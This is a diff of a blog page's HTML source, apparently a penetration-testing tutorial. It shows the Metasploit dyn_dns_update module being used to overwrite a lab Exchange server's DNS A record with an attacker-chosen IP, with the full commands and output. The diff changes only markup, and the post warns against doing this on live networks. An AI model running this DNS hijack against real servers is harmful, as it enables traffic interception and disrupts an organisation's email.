@@ -24,12 +24,12 @@
 &lt;center&gt; **You will break email for the entire company if you do this on a live network. Doing so is possibly a resume generating event.**&lt;/center&gt;
 &lt;center&gt;![](/images/2017/before_dns_update.png)&lt;/center&gt;
 &lt;p&gt;If you are going to be overwriting an existing record make sure to keep a note of the real IP address of the host you are overwriting so that you can fix the record afterwards.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ dig @192.168.80.10 sdexchange.sittingduck.info
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ dig @192.168.80.10 sdexchange.sittingduck.info
 
 ;; ANSWER SECTION:
 sdexchange.sittingduck.info. 1200 IN	A	192.168.80.13
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here is what the module looks like:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/admin/dns/dyn_dns_update
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/admin/dns/dyn_dns_update
 msf auxiliary(dyn_dns_update) &amp;gt; show options
 
 Module options (auxiliary/admin/dns/dyn_dns_update):
@@ -51,7 +51,7 @@ Auxiliary action:
    ----    -----------
    UPDATE  Add or update a record. (default)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It has 3 different actions, but you&amp;rsquo;ll mostly want &lt;code&gt;UPDATE&lt;/code&gt;. &lt;code&gt;UPDATE&lt;/code&gt; will automatically delete a record if it exists already and then add the record back with your specified settings.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; show actions
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; show actions
 
 Auxiliary actions:
 
@@ -60,9 +60,8 @@ Auxiliary actions:
    ADD     Add a new record. Fail if it already exists.
    DELETE  Delete an existing record.
    UPDATE  Add or update a record. (default)
-
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here are the settings I chose. Notice the IP address that I&amp;rsquo;m injecting isn&amp;rsquo;t on the same subnet as the domain.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; set DOMAIN sittingduck.info
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; set DOMAIN sittingduck.info
 DOMAIN =&amp;gt; sittingduck.info
 msf auxiliary(dyn_dns_update) &amp;gt; set HOSTNAME sdexchange
 HOSTNAME =&amp;gt; sdexchange
@@ -71,13 +70,13 @@ IP =&amp;gt; 100.100.100.100
 msf auxiliary(dyn_dns_update) &amp;gt; set RHOST 192.168.80.10
 RHOST =&amp;gt; 192.168.80.10
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the output:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; run
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; run
 
 [+] Found existing A record for sdexchange.sittingduck.info
 [*] Sending dynamic DNS delete message...
-[+] The record &#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&#39; has been deleted!
+[+] The record &amp;#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&amp;#39; has been deleted!
 [*] Sending dynamic DNS add message...
-[+] The record &#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&#39; has been added!
+[+] The record &amp;#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&amp;#39; has been added!
 [*] Auxiliary module execution completed
 msf auxiliary(dyn_dns_update) &amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;game-over&#34;&gt;#Game Over&lt;/h2&gt;
